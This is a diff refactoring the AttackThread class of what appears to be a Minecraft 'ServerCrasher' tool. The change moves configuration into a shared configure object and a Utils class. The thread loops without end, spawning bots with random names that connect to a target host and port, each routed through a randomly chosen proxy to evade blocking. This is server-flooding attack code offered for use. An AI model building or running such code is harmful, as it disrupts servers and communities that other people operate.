@@ -3,6 +3,7 @@ package xyz.zihaoxu;
 import com.github.steveice10.packetlib.ProxyInfo;
 import xyz.zihaoxu.Listeners.Listener;
 import xyz.zihaoxu.protocol.Bot;
+import xyz.zihaoxu.utils.Utils;
 
 import java.lang.reflect.InvocationTargetException;
 import java.net.InetSocketAddress;
@@ -13,14 +14,14 @@ public class AttackThread implements Runnable{ // AttackThread
     public void run() {
         while (true){
             try {
-                String nickname= Configure.generate_random_name(Configure.name_prefix);
+                String nickname= Utils.generate_random_name(ServerCrasher.configure.name_prefix);
                 // String name = Configure.generateRandomName(Configure.name_prefix);
                 System.out.println(nickname+" Creating");
                 ProxyInfo proxy=null;
-                if(Configure.proxies !=null){ // 这里是随机抽取一位幸运代理
-                    String proxy_addr= Configure.proxies.get(new Random().nextInt(Configure.proxies.size()));
+                if(Utils.proxies !=null){ // 这里是随机抽取一位幸运代理
+                    String proxy_addr= Utils.proxies.get(new Random().nextInt(Utils.proxies.size()));
                     proxy=new ProxyInfo(
-                            Configure.proxy_type,
+                            ProxyInfo.Type.valueOf(ServerCrasher.configure.proxy_type.toUpperCase()),
                             new InetSocketAddress(
                                     proxy_addr.split(":")[0],
                                     Integer.parseInt(proxy_addr.split(":")[1])
@@ -28,12 +29,12 @@ public class AttackThread implements Runnable{ // AttackThread
                     );
                 }
                 Bot bot=new Bot( // Bot bot=new Bot(
-                        Configure.host, // Configure.host,
-                        Configure.port, // Configure.port,
+                        ServerCrasher.configure.host, // Configure.host,
+                        ServerCrasher.configure.port, // Configure.port,
                         nickname, // name,
                         proxy // proxy_info
                 );
-                if (!Configure.should_add_listener){
+                if (!ServerCrasher.configure.should_add_listener){
                     bot.addListener(new Listener(bot.getScript())); // bot.addListener(new Listener());
                 }
                 bot.run(); // bot.connect();
